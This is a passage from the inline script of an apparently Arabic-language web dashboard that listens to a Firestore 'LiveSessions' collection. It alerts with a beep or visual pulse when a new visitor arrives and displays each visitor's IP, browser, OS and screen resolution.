    return div;
  }

  function escHtml(s) {
    return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
  }

  // ── Main listener on LiveSessions ─────────────────────────
  function startListening() {
    let firstLoad = true;
    const col = collection(db, 'LiveSessions');

    sessionsUnsub = onSnapshot(col, snap => {
      snap.docChanges().forEach(change => {
        const sid  = change.doc.id;
        const data = change.doc.data();

        if (change.type === 'added') {
          sessions[sid] = data;
          if (!firstLoad && !knownSids.has(sid)) {
            if (audioCtx && audioCtx.state === 'running') {
              playBeep();
            } else {
              // الصوت لم يُفعَّل — نبّه المستخدم بصرياً
              document.getElementById('soundBtn').style.animation = 'pulse-sound 0.5s ease 4';
              setTimeout(() => document.getElementById('soundBtn').style.animation = '', 2500);
            }
            showNotif(`🟢 زائر جديد — ${data.ip || 'IP غير معروف'} · ${data.browser || ''}`);
          }
          knownSids.add(sid);
        } else if (change.type === 'modified') {
          sessions[sid] = data;
        } else if (change.type === 'removed') {
          delete sessions[sid];
          knownSids.delete(sid);
          if (selectedSid === sid) clearSelection();
        }
      });

      firstLoad = false;
      renderSessions();

      // Refresh selected session header if still open
      if (selectedSid && sessions[selectedSid]) {
        const d = sessions[selectedSid];
        document.getElementById('eventsTitle').textContent    = d.ip || selectedSid;
        document.getElementById('eventsSubtitle').textContent = `${d.browser || ''} · ${d.os || ''} · ${d.screenRes || ''}`;
      }
    });
  }

  // Re-render elapsed times every 30s
  setInterval(renderSessions, 30000);
</script>
</body>
</html>
